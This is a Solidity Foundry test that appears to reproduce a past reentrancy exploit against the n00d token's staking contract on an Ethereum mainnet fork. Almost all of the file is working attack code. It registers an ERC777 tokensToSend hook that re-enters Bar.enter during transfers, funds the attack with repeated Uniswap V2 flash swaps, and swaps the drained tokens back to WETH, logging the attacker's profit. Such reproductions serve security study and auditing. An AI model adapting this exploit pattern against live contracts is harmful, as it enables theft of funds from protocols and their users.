// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Analysis
// https://twitter.com/BlockSecTeam/status/1584959295829180416
// https://twitter.com/AnciliaInc/status/1584955717877784576
// TX
// https://etherscan.io/tx/0x8037b3dc0bf9d5d396c10506824096afb8125ea96ada011d35faa89fa3893aea

interface sushiBar {
    function enter(uint256) external;
    function leave(uint256) external;
}

contract ContractTest is Test {
    IERC777 n00d = IERC777(0x2321537fd8EF4644BacDCEec54E5F35bf44311fA);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x5476DB8B72337d44A6724277083b1a927c82a389);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 Xn00d = IERC20(0x3561081260186E69369E6C32F280836554292E08);
    sushiBar Bar = sushiBar(0x3561081260186E69369E6C32F280836554292E08);
    ERC1820Registry registry = ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    uint256 i;
    uint256 enterAmount = 0;
    uint256 n00dReserve;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_826_379);
    }

    function testExploit() public {
        registry.setInterfaceImplementer(
            address(this), bytes32(0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895), address(this)
        );
        n00d.approve(address(Bar), type(uint256).max);
        // The swap is performed 4 times.
        int256 j;
        for (j = 1; j < 5; j++) {
            (n00dReserve,,) = Pair.getReserves();
            Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1));
        }
        // Now all funds can be swapped back to WETH.
        (n00dReserve,,) = Pair.getReserves();
        Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1));
        uint256 amountIn = n00d.balanceOf(address(this));
        (uint256 n00dR, uint256 WETHR,) = Pair.getReserves();
        uint256 amountOut = amountIn * 997 * WETHR / (amountIn * 997 + n00dR * 1000);
        n00d.transfer(address(Pair), amountIn);
        Pair.swap(0, amountOut, address(this), "");

        emit log_named_decimal_uint("Attacker WETH profit after exploit", WETH.balanceOf(address(this)), 18);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        // Resetting count to 0 so we perform re-entry twice each time we swap/loan.
        i = 0;
        enterAmount = n00d.balanceOf(address(this)) / 5;
        Bar.enter(enterAmount);
        Bar.leave(Xn00d.balanceOf(address(this)));
        n00d.transfer(address(Pair), n00dReserve * 1000 / 997 + 1000);
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (to == address(Bar) && i < 2) {
            i++;
            Bar.enter(enterAmount);
        }
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {}
}
